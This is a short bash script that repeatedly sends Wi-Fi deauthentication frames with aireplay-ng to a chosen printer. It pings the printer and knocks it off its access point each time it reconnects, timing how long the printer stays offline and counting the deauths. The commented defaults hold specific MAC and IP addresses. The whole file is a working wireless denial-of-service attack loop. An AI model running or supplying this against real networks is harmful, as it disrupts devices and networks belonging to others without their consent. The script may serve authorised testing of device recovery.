#!/bin/bash

#Set to Router/AP's MAC Address
#APmac=00:11:0a:e9:a5:0d
#APmacANS=y
#Set to printer's MAC Address
#Pmac=38:63:bb:c5:40:45
#PmacANS=y
#Set to printer's IP Address
#PIP=10.19.48.108
#PIPAns=y
#Set to the monitor interface ( mon0, mon1, etc )
#mon=mon0
#monAns=y
Count=0
ST=$SECONDS

clear
echo "Router/AP MAC Address: [y/n] "$APmac
read APmacANS
echo
if [ $APmacANS == n ]; then
    echo "Enter Router/AP MAC Address: "
    read APmac
fi
echo "Printer MAC Address: [y/n] "$Pmac
read PmacANS
echo
if [ $PmacANS == n ]; then
    echo "Enter Printer MAC Address: "
    read Pmac
fi
echo "Printer IP Address: [y/n] "$PIP
read PIPAns
echo
if [ $PIPAns == n ]; then
    echo "Enter Printer IP Address: "
    read PIP
fi
echo "Monitor Interface: [y/n] "$mon
read monAns
echo
if [ $monAns == n ]; then
    echo "Enter Monitor Interface: "
    read mon
fi

while :
do
echo
echo "Pinging printer"
echo
ping -q -c 1 $PIP
if [ $? == 0 ]
then
echo
sudo /usr/sbin/aireplay-ng -0 1 -a $APmac -c $Pmac $mon --ignore-negative-one 
ET=$(($SECONDS - $ST))
ST=$SECONDS
Count=$((Count+1))
echo
clear
echo "Time taken for printer to recover " $ET "seconds"
echo "Deauth acount = "$Count
echo
else
clear
ET=$((SECONDS - $ST))
echo
echo "Printer has been disassociated for " $ET "seconds"
echo "Deauth count = " $Count
echo
fi
done
